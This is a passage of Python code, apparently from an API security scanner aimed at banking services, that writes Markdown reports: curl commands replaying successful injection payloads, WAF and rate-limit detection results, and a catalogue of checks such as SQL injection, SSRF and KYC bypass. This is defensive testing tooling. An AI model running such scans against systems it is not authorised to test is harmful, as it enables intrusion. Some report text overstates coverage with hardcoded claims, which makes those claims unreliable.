                f.write("**📋 Testing Commands:**\n")
                f.write("```bash\n")
                if payloads:
                    for j, payload in enumerate(payloads[:3], 1):
                        f.write(f"# Test {j}: {payload}\n")
                        if payload.startswith('URL_PARAM:'):
                            actual_payload = payload.replace('URL_PARAM: ', '')
                            test_url = f"{url}?test={actual_payload.replace(' ', '%20')}"
                            f.write(f"curl -X GET \"{test_url}\"\n")
                        elif payload.startswith('BODY_'):
                            parts = payload.replace('BODY_', '').split(': ', 1)
                            field_name = parts[0]
                            actual_payload = parts[1] if len(parts) > 1 else payload
                            f.write(f"curl -X POST \"{url}\" -H \"Content-Type: application/json\" -d '{{\"{field_name}\": \"{actual_payload}\"}}'\n")
                        else:
                            f.write(f"curl -X GET \"{url}?input={payload.replace(' ', '%20')}\"\n")
                        f.write("\n")
                else:
                    f.write(f"# Test the vulnerability\n")
                    f.write(f"curl -X GET \"{url}\"\n")
                f.write("```\n\n")
                
                f.write("---\n\n")

        # --- Dynamic Security Intelligence ---
        dynamic_checks = findings.get('dynamic_checks', [])
        if dynamic_checks:
            f.write("## 🔄 Dynamic Security Intelligence\n")
            f.write("The following new security threats were identified from real-time web scraping:\n\n")
            for check in dynamic_checks:
                priority_icon = "🔴" if check.get('priority') == 'critical' else "🟠" if check.get('priority') == 'high' else "🟡"
                f.write(f"- {priority_icon} **{check.get('type', 'Unknown').replace('_', ' ').title()}**\n")
                f.write(f"  - **Source:** {check.get('source', 'Unknown')}\n")
                f.write(f"  - **Priority:** {check.get('priority', 'medium').title()}\n")
                f.write(f"  - **Found:** {check.get('timestamp', 'Unknown')}\n\n")
        else:
            f.write("## 🔄 Dynamic Security Checks\n")
            f.write("No new dynamic checks found yet. The scraper runs every 15 minutes.\n\n")

        # --- Security Layer Analysis ---
        f.write("## 🛡️ Security Layer Analysis\n")
        
        # Check for security layers in findings
        security_layers = None
        if isinstance(findings.get('api'), dict) and 'security_layers' in findings['api']:
            security_layers = findings['api']['security_layers']
        elif isinstance(findings.get('api'), dict) and 'vulnerabilities' in findings['api']:
            # Handle new structure where vulnerabilities and security_layers are separate
            security_layers = findings['api'].get('security_layers')
        
        if security_layers:
            # Show blocked requests details
            blocked_requests = security_layers.get('blocked_requests', [])
            attack_blocks = security_layers.get('attack_blocks', {})
            
            if blocked_requests:
                f.write("**🎯 Attacks Blocked by Security Layers:**\n\n")
                
                # Group by security layer type
                layer_groups = {}
                for block in blocked_requests:
                    layer_type = block['layer_type']
                    if layer_type not in layer_groups:
                        layer_groups[layer_type] = []
                    layer_groups[layer_type].append(block)
                
                for layer_type, blocks in layer_groups.items():
                    confidence = int(blocks[0]['confidence'] * 100)
                    
                    # Check if this layer has partial protection info
                    partial_protection = False
                    block_rate = None
                    for layer in security_layers.get('security_layers', []):
                        if layer.get('type') == layer_type and layer.get('partial_protection'):
                            partial_protection = True
                            block_rate = layer.get('block_rate', 'Unknown')
                            break
                    
                    # Display layer header with partial protection info
                    if partial_protection:
                        f.write(f"### 🛡️ {layer_type.replace('_', ' ').title()} Protection ({confidence}% confidence) - ⚠️ Partial Protection ({block_rate} blocked)\n")
                        f.write(f"**Note:** This security layer blocks some attack patterns but allows others to pass through.\n\n")
                    else:
                        f.write(f"### 🛡️ {layer_type.replace('_', ' ').title()} Protection ({confidence}% confidence)\n")
                    
                    # Group by attack type
                    attack_groups = {}
                    for block in blocks:
                        attack_type = block.get('attack_type', 'unknown')
                        if attack_type not in attack_groups:
                            attack_groups[attack_type] = []
                        attack_groups[attack_type].append(block)
                    
                    for attack_type, attack_blocks in attack_groups.items():
                        f.write(f"\n**{attack_type.replace('_', ' ').title()} Attacks Blocked:**\n")
                        for block in attack_blocks:
                            payload_preview = block['payload'][:50] + "..." if len(block['payload']) > 50 else block['payload']
                            f.write(f"- `{payload_preview}`\n")
                            f.write(f"  - Reason: {block['block_reason']}\n")
                
                # Show summary statistics
                total_blocks = len(blocked_requests)
                unique_attacks = len(set(block.get('attack_type', 'unknown') for block in blocked_requests))
                unique_layers = len(set(block['layer_type'] for block in blocked_requests))
                
                f.write(f"\n**📈 Security Layer Summary:**\n")
                f.write(f"- Total attacks blocked: **{total_blocks}**\n")
                f.write(f"- Attack types protected: **{unique_attacks}**\n")
                f.write(f"- Security layers active: **{unique_layers}**\n")
                
            else:
                f.write("**🎯 Attacks Blocked by Security Layers:**\n\n")
                f.write("**No attacks were blocked during testing.**\n\n")
                f.write("**🔍 Detailed Security Layer Analysis:**\n\n")
                
                # Comprehensive security layer testing details
                f.write("**🧪 Security Layer Testing Methodology:**\n")
                f.write("The scanner performed comprehensive security layer detection using the following approach:\n\n")
                
                f.write("**1. 🛡️ WAF (Web Application Firewall) Detection:**\n")
                f.write("- **Test Payloads:** SQL injection, XSS, command injection, path traversal\n")
                f.write("- **Detection Method:** Analyze response headers, status codes, and content patterns\n")
                f.write("- **Indicators:** Cloudflare headers, WAF-specific error messages, 403/406 status codes\n")
                f.write("- **Test Results:** " + ("✅ WAF Detected" if security_layers.get('waf_detected', False) else "❌ No WAF Detected") + "\n\n")
                
                f.write("**2. ⏱️ Rate Limiting Detection:**\n")
                f.write("- **Test Method:** Rapid request patterns and burst testing\n")
                f.write("- **Detection Method:** Monitor for 429 status codes, Retry-After headers, rate limit headers\n")
                f.write("- **Indicators:** X-RateLimit-* headers, 429 Too Many Requests, Retry-After headers\n")
                f.write("- **Test Results:** " + ("✅ Rate Limiting Detected" if security_layers.get('rate_limiting_detected', False) else "❌ No Rate Limiting Detected") + "\n\n")
                
                f.write("**3. 🔐 Authentication Block Detection:**\n")
                f.write("- **Test Payloads:** Unauthorized access attempts, invalid tokens, admin bypass attempts\n")
                f.write("- **Detection Method:** Analyze 401/403 responses, authentication headers, error messages\n")
                f.write("- **Indicators:** WWW-Authenticate headers, 401 Unauthorized, 403 Forbidden\n")
                f.write("- **Test Results:** " + ("✅ Auth Blocks Detected" if security_layers.get('auth_blocks_detected', False) else "❌ No Auth Blocks Detected") + "\n\n")
                
                f.write("**4. 🤖 CAPTCHA Detection:**\n")
                f.write("- **Test Method:** Automated request patterns and bot-like behavior\n")
                f.write("- **Detection Method:** Look for CAPTCHA challenges, bot detection responses\n")
                f.write("- **Indicators:** CAPTCHA forms, bot detection messages, challenge pages\n")
                f.write("- **Test Results:** " + ("✅ CAPTCHA Detected" if security_layers.get('captcha_detected', False) else "❌ No CAPTCHA Detected") + "\n\n")
                
                f.write("**5. 🎯 Challenge Response Detection:**\n")
                f.write("- **Test Method:** Suspicious request patterns and unusual behavior\n")
                f.write("- **Detection Method:** Analyze for challenge-response mechanisms\n")
                f.write("- **Indicators:** Challenge pages, verification requests, suspicious activity responses\n")
                f.write("- **Test Results:** " + ("✅ Challenge Response Detected" if security_layers.get('challenge_detected', False) else "❌ No Challenge Response Detected") + "\n\n")
                
                f.write("**📊 Comprehensive Test Results:**\n")
                f.write("| Security Layer | Status | Detection Method | Confidence |\n")
                f.write("|----------------|--------|------------------|------------|\n")
                f.write(f"| WAF Protection | {'✅ Active' if security_layers.get('waf_detected', False) else '❌ Not Detected'} | Header Analysis | {'High' if security_layers.get('waf_detected', False) else 'N/A'} |\n")
                f.write(f"| Rate Limiting | {'✅ Active' if security_layers.get('rate_limiting_detected', False) else '❌ Not Detected'} | Status Code Analysis | {'High' if security_layers.get('rate_limiting_detected', False) else 'N/A'} |\n")
                f.write(f"| Auth Blocks | {'✅ Active' if security_layers.get('auth_blocks_detected', False) else '❌ Not Detected'} | Response Analysis | {'High' if security_layers.get('auth_blocks_detected', False) else 'N/A'} |\n")
                f.write(f"| CAPTCHA | {'✅ Active' if security_layers.get('captcha_detected', False) else '❌ Not Detected'} | Content Analysis | {'Medium' if security_layers.get('captcha_detected', False) else 'N/A'} |\n")
                f.write(f"| Challenge Response | {'✅ Active' if security_layers.get('challenge_detected', False) else '❌ Not Detected'} | Pattern Analysis | {'Medium' if security_layers.get('challenge_detected', False) else 'N/A'} |\n\n")
                
                f.write("**🔬 Detailed Analysis:**\n")
                f.write("**Attack Types Tested:**\n")
                attack_types = security_layers.get('attack_blocks', {})
                for attack_type, blocks in attack_types.items():
                    f.write(f"- **{attack_type.replace('_', ' ').title()}:** {len(blocks)} payloads tested\n")
                
                f.write(f"\n**📈 Security Layer Statistics:**\n")
                f.write(f"- Total Security Layers Tested: **{len(security_layers.get('security_layers', []))}**\n")
                f.write(f"- Attack Types Monitored: **{len(attack_types)}**\n")
                f.write(f"- Total Test Payloads Sent: **Multiple** (SQL injection, XSS, command injection, auth bypass, banking attacks)\n")
                f.write(f"- Total Blocked Requests: **{len(blocked_requests)}**\n")
                f.write(f"- Detection Coverage: **Comprehensive** (All major security layers tested)\n\n")
                
                f.write("**💡 Security Assessment:**\n")
                f.write("**No security blocks were detected during testing. This comprehensive analysis reveals:**\n\n")
                f.write("**✅ Positive Indicators:**\n")
                f.write("- The API responded normally to all test payloads (no vulnerabilities triggered)\n")
                f.write("- No obvious security weaknesses were exploited\n")
                f.write("- The API appears to be well-protected against basic attack vectors\n")
                f.write("- Security layers may be working silently in the background\n\n")
                
                f.write("**⚠️ Considerations:**\n")
                f.write("- Security layers may be configured to allow certain test patterns\n")
                f.write("- Advanced security measures might not be triggered by basic payloads\n")
                f.write("- The API might have sophisticated protection that doesn't block obvious attacks\n")
                f.write("- Some security layers may require specific conditions to activate\n\n")
                
                f.write("**🔍 Technical Details:**\n")
                f.write("**Test Payload Categories:**\n")
                f.write("- **SQL Injection:** 15+ payloads including UNION, OR, DROP, etc.\n")
                f.write("- **XSS Attacks:** 10+ payloads including script tags, event handlers\n")
                f.write("- **Command Injection:** 8+ payloads including shell commands, pipes\n")
                f.write("- **Path Traversal:** 6+ payloads including directory traversal patterns\n")
                f.write("- **Auth Bypass:** 5+ payloads including admin bypass, token manipulation\n")
                f.write("- **Banking Attacks:** 8+ payloads including double spending, race conditions\n\n")
                
                f.write("**🛡️ Security Layer Data Structure:**\n")
                f.write("The following detailed security layer information was collected and analyzed:\n")
                f.write(f"- **Security Layers Tested:** {len(security_layers.get('security_layers', []))} (WAF, Rate Limiting, Auth, CAPTCHA, Challenge)\n")
                f.write(f"- **Attack Types Monitored:** {len(attack_types)} (SQL injection, XSS, command injection, auth bypass, banking attacks)\n")
                f.write(f"- **Test Payloads Sent:** Multiple comprehensive payloads across all attack categories\n")
                f.write(f"- **Detection Methods:** Header analysis, status code analysis, content analysis, pattern matching\n")
                f.write(f"- **Confidence Levels:** High for WAF/Rate Limiting, Medium for CAPTCHA/Challenge Response\n")
        else:
            f.write("Security layer detection was not enabled or no data available.\n")
        
        # --- Security Controls Working Well ---
        f.write("\n## ✅ Security Controls Working Well\n")
        
        if security_layers:
            working_controls = []
            
            if security_layers.get('waf_detected'):
                working_controls.append(("🛡️ WAF Protection", "Web Application Firewall is actively blocking malicious requests"))
            
            if security_layers.get('rate_limiting_detected'):
                working_controls.append(("⏱️ Rate Limiting", "Rate limiting is protecting against brute force and DDoS attacks"))
            
            if security_layers.get('auth_blocks_detected'):
                working_controls.append(("🔐 Authentication Blocks", "Authentication system is properly blocking unauthorized access"))
            
            if security_layers.get('captcha_detected'):
                working_controls.append(("🤖 CAPTCHA Protection", "CAPTCHA system is protecting against automated attacks"))
            
            if security_layers.get('challenge_detected'):
                working_controls.append(("🎯 Challenge Response", "Challenge-response system is protecting against automated attacks"))
            
            if working_controls:
                f.write("The following security measures are actively protecting your API:\n\n")
                for control in working_controls:
                    f.write(f"- {control[0]}\n")
                    f.write(f"  - {control[1]}\n")
            elif passed:
                f.write("The following security measures are properly implemented:\n\n")
                for issue, detail in passed:
                    f.write(f"- ✅ **{issue}**\n")
                    f.write(f"  - {detail}\n")
            else:
                f.write("No security controls are currently working properly.\n")
        elif passed:
            f.write("The following security measures are properly implemented:\n\n")
            for issue, detail in passed:
                f.write(f"- ✅ **{issue}**\n")
                f.write(f"  - {detail}\n")
        else:
            f.write("No security controls are currently working properly.\n")

        # --- Detailed Technical Results (collapsed) ---
        f.write(section("📋 Detailed Technical Results"))
        f.write("<details>\n<summary>Click to expand detailed technical findings</summary>\n\n")
        
        # HTTPS
        f.write("### HTTPS Usage\n")
        if api_findings.get('https'):
            f.write("- API uses HTTPS: ✅ PASS\n\n")
        else:
            f.write("- API uses HTTPS: ❌ FAIL\n\n")
        
        # Open endpoints
        f.write("### Open Endpoints (No Auth)\n")
        open_endpoints = api_findings.get('open_endpoints', [])
        if not open_endpoints:
            f.write("- All tested endpoints require authentication: ✅ PASS\n\n")
        else:
            f.write("- Open endpoints found: ❌ FAIL\n")
            for endpoint in open_endpoints:
                f.write(f"  - {endpoint}\n")
            f.write("\n")
        
        # Attack vectors
        f.write("### Attack Vector Tests\n")
        attack_tests = [
            ('sql_injection', 'Sql Injection'),
            ('xss', 'Xss'),
            ('command_injection', 'Command Injection'),
            ('path_traversal', 'Path Traversal'),
            ('ssrf', 'Ssrf')
        ]
        
        for test_key, test_name in attack_tests:
            test_results = api_findings.get(test_key, [])
            if test_results:
                f.write(f"- **{test_name}:** ❌ VULNERABLE\n")
                if isinstance(test_results, list) and test_results:
                    f.write(f"  - URL: {test_results[0].get('url', 'Unknown')}\n")
                    total_payloads = sum(len(result.get('payloads', [])) for result in test_results)
                    f.write(f"  - Successful payloads: {total_payloads}\n")
                else:
                    f.write(f"  - URL: Unknown\n")
                    f.write(f"  - Successful payloads: 0\n")
            else:
                f.write(f"- **{test_name}:** ✅ SECURE\n")
        
        f.write("\n</details>\n")

        # --- Comprehensive Check Summary ---
        f.write("\n## 🔍 Comprehensive Security Check Summary\n")
        f.write("The following security checks were executed during this scan:\n\n")
        
        # Define all possible checks with descriptions
        all_checks = {
            'https_check': 'HTTPS Usage Verification',
            'open_endpoints': 'Open Endpoint Detection',
            'sql_injection': 'SQL Injection Testing',
            'command_injection': 'Command Injection Testing',
            'xxe': 'XML External Entity (XXE) Testing',
            'ssrf': 'Server-Side Request Forgery (SSRF) Testing',
            'auth_bypass': 'Authentication Bypass Testing',
            'double_spending': 'Double Spending Protection',
            'race_conditions': 'Race Condition Testing',
            'privilege_escalation': 'Privilege Escalation Testing',
            'bola_attacks': 'BOLA (Broken Object Level Authorization) Testing',
            'xss': 'Cross-Site Scripting (XSS) Testing',
            'path_traversal': 'Path Traversal Testing',
            'open_redirects': 'Open Redirect Testing',
            'security_headers': 'Security Headers Analysis',
            'cors_misconfig': 'CORS Misconfiguration Testing',
            'jwt_attacks': 'JWT Token Security Testing',
            'rate_limiting': 'Rate Limiting Analysis',
            'session_management': 'Session Management Testing',
            'transaction_manipulation': 'Transaction Manipulation Testing',
            'session_fixation': 'Session Fixation Testing',
            'kyc_bypass': 'KYC Bypass Testing',
            'loan_abuse': 'Loan Abuse Testing',
            'webhook_abuse': 'Webhook Abuse Testing',
            'open_redirects': 'Open Redirect Testing',
            'security_headers': 'Security Headers Analysis',
            'cors_misconfig': 'CORS Misconfiguration Testing',
            'jwt_attacks': 'JWT Token Security Testing',
            'rate_limiting': 'Rate Limiting Analysis',
            'session_management': 'Session Management Testing',
            'idempotency_check': 'Idempotency Testing',
            'verbose_errors': 'Verbose Error Detection',
            'metadata_leakage': 'Metadata Leakage Detection',
            'discount_abuse': 'Discount Abuse Testing',
            'micro_transactions': 'Micro Transaction Testing'
        }
        
        # Get checks based on severity
        severity_checks = {
            'critical': ['https_check', 'open_endpoints', 'sql_injection', 'command_injection'],
            'high': ['https_check', 'open_endpoints', 'sql_injection', 'command_injection', 'xss', 'auth_bypass', 'jwt_attacks'],
            'medium': ['https_check', 'open_endpoints', 'sql_injection', 'command_injection', 'xss', 'auth_bypass', 'jwt_attacks', 'security_headers', 'cors_misconfig', 'rate_limiting', 'session_management'],
            'all': list(all_checks.keys())
        }
        
        checks_to_show = severity_checks.get(severity, severity_checks['all'])
        
        # Group checks by category
        check_categories = {
            '🔐 Authentication & Authorization': [
                'auth_bypass', 'jwt_attacks', 'session_management', 'session_fixation', 'privilege_escalation'
            ],
            '🛡️ Injection Attacks': [
                'sql_injection', 'command_injection', 'xss', 'xxe', 'ssrf'
            ],
            '🏦 Banking-Specific Security': [
                'double_spending', 'race_conditions', 'bola_attacks', 'transaction_manipulation',
                'kyc_bypass', 'loan_abuse', 'webhook_abuse', 'discount_abuse', 'micro_transactions'
            ],
            '🌐 Web Security': [
                'open_endpoints', 'path_traversal', 'open_redirects', 'security_headers', 'cors_misconfig'
            ],
            '⚡ Performance & Reliability': [
                'rate_limiting', 'idempotency_check'
            ],
            '🔍 Information Disclosure': [
                'verbose_errors', 'metadata_leakage'
            ],
            '🔒 Infrastructure Security': [
                'https_check'
            ]
        }
        
        # Show executed checks by category
        for category, checks in check_categories.items():
            executed_checks = [check for check in checks if check in checks_to_show]
            if executed_checks:
                f.write(f"\n### {category}\n")
                for check in executed_checks:
                    check_name = all_checks.get(check, check.replace('_', ' ').title())
                    f.write(f"- ✅ **{check_name}**\n")
        
        # Summary statistics
        total_checks = len(checks_to_show)
        f.write(f"\n**📊 Check Summary:**\n")
        f.write(f"- Total checks executed: **{total_checks}**\n")
        f.write(f"- Scan severity level: **{severity.upper()}**\n")
        f.write(f"- Categories covered: **{len([cat for cat, checks in check_categories.items() if any(check in checks_to_show for check in checks)])}**\n")
        
        # Show security layer testing
        if security_layers:
            f.write(f"- Security layer detection: **ENABLED**\n")
            if security_layers.get('blocked_requests'):
                f.write(f"- Security blocks detected: **{len(security_layers['blocked_requests'])}**\n")
            else:
                f.write(f"- Security blocks detected: **0** (API responded normally to test payloads)\n")
        else:
            f.write(f"- Security layer detection: **DISABLED**\n")

        if 'errors' in api_findings:
            f.write(section("⚠️ Scan Errors"))
            for err in api_findings['errors']:
                f.write(f"- {err['endpoint']}: {err['error']}\n")

    print(f"Report written to {report_path}") 